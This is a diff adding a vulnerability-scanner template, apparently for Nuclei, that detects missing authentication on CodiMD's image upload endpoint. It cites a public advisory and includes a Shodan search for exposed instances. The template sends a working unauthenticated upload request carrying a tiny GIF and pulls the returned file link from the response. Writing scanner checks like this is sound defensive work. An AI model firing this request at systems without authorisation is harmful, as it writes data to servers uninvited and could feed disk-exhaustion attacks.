@@ -1,0 +1,49 @@
+id: codimd-unauth-file-upload
+
+info:
+  name: CodiMD - File Upload
+  author: denandz,PulseSecurity.co.nz
+  severity: medium
+  description: |
+    CodiMD does not require valid authentication to access uploaded images or to upload new image data. An attacker who can determine an uploaded image's URL can gain unauthorised access to uploaded image data, or can create a denial of service condition by exhausting all available disk space.
+  reference:
+    - https://github.com/hackmdio/codimd/security/advisories/GHSA-2764-jppc-p2hm
+    - https://pulsesecurity.co.nz/advisories/codimd-missing-image-access-controls
+  metadata:
+    max-request: 1
+    verified: true
+    shodan-query: html:"CodiMD"
+  tags: file-upload,intrusive,codimd
+
+http:
+  - raw:
+      - |
+        POST /uploadimage HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=---------------------------92633278134516118923780781161
+
+        -----------------------------92633278134516118923780781161
+        Content-Disposition: form-data; name="image"; filename="{{randstr}}.gif"
+        Content-Type: image/gif
+
+        {{base64_decode("R0lGODlhAQABAIABAP///wAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==")}}
+        -----------------------------92633278134516118923780781161--
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - '"link":".*?.gif"'
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - '"link":"(.*)"'
+# digest: 4a0a00473045022100ef428961687368873537e6000fdd68686cadc910b6becdbba641b4d26a532d4102202e2b8c020d96ee350519c007eeeceb62b43ca94390f272611b8671b254a05642:922c64590222798bb761d5b6d8e72950
